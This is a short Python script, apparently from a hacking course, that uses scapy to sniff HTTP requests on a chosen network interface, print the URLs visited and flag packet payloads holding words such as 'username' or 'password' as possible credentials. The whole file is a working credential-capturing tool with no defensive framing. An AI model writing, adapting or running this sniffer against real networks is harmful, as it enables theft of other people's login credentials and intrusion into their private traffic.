#!/usr/bin/env python

import argparse
import scapy.all as scapy
from scapy.layers import http

def get_argument():
	parser = argparse.ArgumentParser()
	parser.add_argument("-i", "--interface", dest="interface", help="Interface to sniff on")
	options = parser.parse_args()
	if not options.interface:
		parser.error("[-] Please specify interface to sniff on, use -h or --help for more info.")
	return options

def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
	return  packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_creds(packet):
	if packet.haslayer(scapy.Raw):
			load = str(packet[scapy.Raw].load)
			keywords = ["username", "user", "uname", "password", "pass", "login"]
			for keyword in keywords:
				if keyword in load:
					return load

def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		url = get_url(packet)
		login_info = get_creds(packet)
		print("[+] URL  ->  " + str(url))
		if login_info:
			print("\n\n[+] Possible credentials:\n\n" + login_info + "\n\n" )
		
#----------------------------MAIN-------------------------------------------
options = get_argument()
sniff(options.interface)
